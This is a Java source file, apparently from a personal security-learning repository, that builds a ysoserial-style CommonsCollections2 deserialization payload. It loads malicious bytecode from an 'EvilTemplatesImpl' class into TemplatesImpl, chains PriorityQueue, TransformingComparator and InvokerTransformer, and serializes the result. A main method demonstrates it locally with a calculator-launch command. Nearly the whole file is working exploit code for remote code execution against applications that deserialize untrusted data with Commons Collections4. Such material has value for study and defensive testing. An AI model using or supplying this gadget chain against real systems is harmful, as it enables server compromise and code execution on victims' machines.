package com.xjjlearning.hack.java.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilTemplatesImpl;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Optional;
import java.util.PriorityQueue;

import static com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil.setFieldValue;

/**
 * created by xjj on 2023/2/8
 */
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
							     TemplatesImpl.newTransformer()
 */
public class CommonsCollections2Temp {
    // jdk8u71以及之后的版本使用
    public byte[] getPayload(String exp) throws Exception {
        class TFactory extends TransformerFactoryImpl {
        }
        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", new TFactory());
        Transformer transformer = new InvokerTransformer("toString", null, null); // toString 没有用, 后面会替换掉

        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
        priorityQueue.offer(templates);
        priorityQueue.offer(templates); // 两个元素执行调整堆大小的操作
        ReflectionUtil.setFieldValue(transformer, "iMethodName", "newTransformer");

        Optional<byte[]> b = SerializationUtil.serialize(priorityQueue);
        return b.get();
    }

    private void gadget() throws Exception {
        String exp = "open -a Calculator";
        byte[] payload = getPayload(exp);
        SerializationUtil.deserialize(payload);
    }

    public static void main(String[] args) throws Exception {
        new CommonsCollections2Temp().gadget();
    }
}
